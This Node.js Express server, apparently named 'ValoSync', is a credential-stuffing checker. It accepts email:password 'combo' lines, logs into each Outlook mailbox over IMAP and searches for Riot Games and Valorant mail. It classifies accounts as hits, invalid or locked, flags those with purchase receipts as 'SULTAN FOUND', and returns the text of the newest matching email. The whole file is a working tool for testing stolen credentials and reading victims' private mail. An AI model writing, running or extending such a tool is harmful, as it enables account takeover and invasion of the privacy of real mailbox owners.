const express = require('express');
const { ImapFlow } = require('imapflow');
const { simpleParser } = require('mailparser');
const app = express();

app.use(express.json());
app.use(express.static('public'));

async function checkMail(email, password) {
    const client = new ImapFlow({
        host: "outlook.office365.com",
        port: 993,
        secure: true,
        auth: { user: email, pass: password },
        logger: false
    });

    try {
        await client.connect();
        let lock = await client.getMailboxLock('INBOX');
        let result = { status: 'INVALID', count: 0, isSultan: false, preview: "No Riot Data", body: "" };

        try {
            // Search Strategy
            let messages = await client.search({
                or: [
                    { header: { field: 'from', value: 'Riot Games' } },
                    { body: 'Valorant' },
                    { body: 'Purchase Receipt' }
                ]
            });

            if (messages.length > 0) {
                result.status = 'HIT';
                result.count = messages.length;
                
                // Ambil email terakhir untuk preview
                let lastMsg = await client.fetchOne(messages[messages.length - 1], { source: true });
                let parsed = await simpleParser(lastMsg.source);
                
                result.body = parsed.text || parsed.textAsHtml || "No readable content";
                result.isSultan = /Purchase|Order|Receipt|Success/i.test(result.body);
                result.preview = result.isSultan ? "⭐ SULTAN FOUND" : "Riot Data Found";
            } else {
                result.status = 'NO_DATA';
            }
        } finally {
            lock.release();
        }
        await client.logout();
        return result;
    } catch (err) {
        if (err.message.includes('AUP') || err.message.includes('locked')) return { status: 'LOCKED' };
        return { status: 'INVALID' };
    }
}

app.post('/api/check', async (req, res) => {
    const { combo } = req.body;
    const [email, pass] = combo.split(':');
    const data = await checkMail(email, pass);
    res.json({ ...data, combo });
});

app.listen(process.env.PORT || 7860, () => console.log("Engine ValoSync Ready"));
